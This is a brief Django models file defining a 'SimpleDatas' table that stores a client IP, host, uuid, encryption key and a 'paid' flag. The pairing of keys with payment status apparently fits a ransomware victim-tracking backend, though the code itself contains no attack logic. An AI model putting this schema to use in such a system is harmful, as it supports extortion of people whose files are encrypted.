from __future__ import unicode_literals

from django.db import models

# Create your models here.

class SimpleDatas(models.Model) :
    client_adress = models.GenericIPAddressField()
    host = models.TextField()
    uuid = models.TextField()
    encryption_key = models.TextField()
    paid = models.BooleanField(default=False)

    def __str__(self):
        return self.uuid
